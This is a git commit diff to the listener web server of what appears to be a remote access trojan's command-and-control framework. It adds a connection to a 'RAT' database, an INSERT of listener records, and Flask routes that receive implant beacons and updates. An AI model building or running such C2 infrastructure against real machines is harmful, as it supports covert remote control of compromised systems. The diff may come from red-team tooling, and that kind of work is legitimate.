5b7ddaaa4aebca77aae5e86d2189bdc9168b1f8a
Hunter Hardman <t3ntman@gmail.com>
2017-04-15 15:59:13 -0600

    Added in INSERT statement to "listeners" table

--- listener/core/webserver.py
+++ listener/core/webserver.py
@@ -1,4 +1,8 @@
 import json
+import pymysql
+import sys
+from core.config import *
+from colorama import Fore, Style
 from flask import Flask
 from flask import request
 from flask import make_response
@@ -18,17 +22,39 @@ class WebServer(object):
         with open(self.profile) as file:
             self.json_data = json.load(file)
 
+        # tries to establish a connection to the "RAT" database
+        try:
+            self.connection = pymysql.connect(host="localhost", port=3306, user=username, passwd=password, db=database, autocommit=True)
+
+        # exits the program if an exception is raised
+        except:
+            print(Style.BRIGHT + Fore.RED + "[!] Unable to establish database connection." + Style.RESET_ALL)
+            sys.exit()
+
     def start_webserver(self):
         if self.protocol == "https":
             # TO DO: add in flask ssl context here instead of print()
             print("https protocol selected")
 
-        # TO DO: inserts entry into "listeners" table
+        # inserts entry into "listeners" table
+        cursor = self.connection.cursor()
+        cursor.execute("INSERT INTO listeners (protocol, external_address, port, profile) VALUES (%s, %s, %s, %s)",
+            (self.protocol, self.external_address, self.port, self.profile))
+        cursor.close()
+
+        # TO DO: wrap this in a try except statement
 
         # adds routes and starts flask web server
         app.add_url_rule(self.json_data["implant"]["beacon_uri"], None, self.beacon, methods=["GET", "POST"])
         app.add_url_rule(self.json_data["implant"]["update_uri"], None, self.update, methods=["GET", "POST"])
         app.run("0.0.0.0", self.port)
+
+    def stop_webserver(self):
+        # TO DO: stop flask webserver
+        # this will be called if a keyboard exception (CTRL+C) is raised
+
+        # TO DO: delete entry from "listeners" table
+        print("stopping webserver") # DEBUGGING
 
     def beacon(self):
         # parses json profile and configures malleable beacon http response
